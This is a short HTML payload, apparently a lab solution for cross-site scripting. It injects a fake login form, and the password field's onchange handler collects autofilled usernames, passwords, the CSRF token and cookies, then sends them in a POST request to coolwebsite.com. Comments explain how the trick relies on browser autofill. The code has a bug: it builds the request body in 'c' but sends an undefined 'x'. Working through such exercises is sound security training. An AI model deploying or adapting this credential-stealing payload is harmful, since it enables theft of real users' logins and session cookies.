<!--inserts a fake login form, steals the username and password when entered, and makes a post request-->
<!--Compressed for easier reading-->

Login</p>
    <!--take note of the autocomplete="on", this helps make sure the password is autofilled-->
    <form class=login-form method=POST action="/login" autocomplete="on">
        <label>Username</label>
        <input required type=username name="username" autofocus>
        <label>Password</label>
        <!--Take note of the onchange attribute where we insert our code. This prevents us from having to mess around with event listeners
         and only executes the script if autofilled-->
        <input required type=password name="password" onchange="
            alert(1);
            let c = 'csrf=' + document.getElementsByName('csrf')[0].value + '&postId=2&
            comment=username={' + document.getElementsByName('username')[0].value + '}password={' + document.getElementsByName('password')[0].value + '}
            &name=victim&email=email1%40gmail.com&website=https%3A%2F%2Ftest1.org';
            alert(2);fetch('https://coolwebsite.com/post/comment', {
                method: 'POST', 
                headers: {
                    'Cookie': document.cookie, 
                    'Content-Type': 'application/x-www-form-urlencoded'},
                body: x});
            alert('success!');">
        <button class=button type=submit> Log in </button>
    </form>